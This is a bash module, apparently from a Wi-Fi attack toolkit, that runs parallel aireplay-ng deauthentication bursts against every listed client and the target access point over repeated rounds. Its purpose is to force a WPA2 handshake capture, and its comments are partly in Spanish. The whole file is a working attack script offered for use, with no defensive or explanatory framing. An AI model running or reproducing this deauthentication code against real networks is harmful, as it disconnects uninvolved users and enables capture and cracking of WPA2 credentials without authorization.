#!/usr/bin/env bash
# lib/deauth.sh -- Deauthentication to force a WPA2 handshake.
# Not executed directly. Loaded by the entrypoint.
#
# DISEÑO — TODOS LOS CLIENTES EN PARALELO:
# ─────────────────────────────────────────
# Every client gets its own aireplay-ng process launched in the background
# simultaneously. 1 client or 1000 -> same mechanism, same burst.
# Al final de cada ronda se hace wait de todos antes de la siguiente.
# run_deauth termina inmediatamente cuando capture.sh hace kill $deauth_pid.

# _deauth_burst: one full round -- all clients + broadcast in parallel.
_deauth_burst() {
    local round="$1" log_file="$2"
    shift 2
    local -a macs=("$@")
    local -a pids=()

    dbg "-- Round ${round}: parallel deauth to $((${#macs[@]} + 1)) target(s) --"

    # One process per client, all simultaneous
    for mac in "${macs[@]}"; do
        dbg "  [parallel] directed -> ${mac}"
        aireplay-ng \
            --deauth "$DEAUTH_N" \
            -a "$TARGET" \
            -c "$mac" \
            "$MON" >>"$log_file" 2>&1 &
        pids+=($!)
    done

    # Broadcast always, in parallel with the directed ones
    dbg "  [parallel] broadcast -> AP ${TARGET}"
    aireplay-ng \
        --deauth "$DEAUTH_N" \
        -a "$TARGET" \
        "$MON" >>"$log_file" 2>&1 &
    pids+=($!)

    # Esperar a que todos terminen antes de la siguiente ronda
    for pid in "${pids[@]}"; do
        wait "$pid" 2>/dev/null || true
    done

    dbg "  Round ${round} done."
}

# run_deauth: load clients, launch the round loop in the background.
# Imprime el PID del subshell a stdout para que capture.sh lo pueda matar.
run_deauth() {
    local log_file="$1"
    local -a client_macs=()

    while IFS= read -r mac; do
        if [[ -n "$mac" ]]; then
            client_macs+=("$mac")
        fi
    done < <(get_client_macs)

    local n=${#client_macs[@]}
    if ((n > 0)); then
        info "Parallel deauth: ${n} client(s) + broadcast  (${DEAUTH_ROUNDS} round(s))"
        for mac in "${client_macs[@]}"; do
            info "  -> ${mac}"
        done
    else
        warn "No clients -- broadcast deauth only  (${DEAUTH_ROUNDS} round(s))."
    fi

    (
        for r in $(seq 1 "$DEAUTH_ROUNDS"); do
            _deauth_burst "$r" "$log_file" "${client_macs[@]}"
            ((r < DEAUTH_ROUNDS)) && sleep "$DEAUTH_INTERVAL"
        done
        dbg "Deauth cycle done (${DEAUTH_ROUNDS} rounds)."
    ) &

    echo $!
}
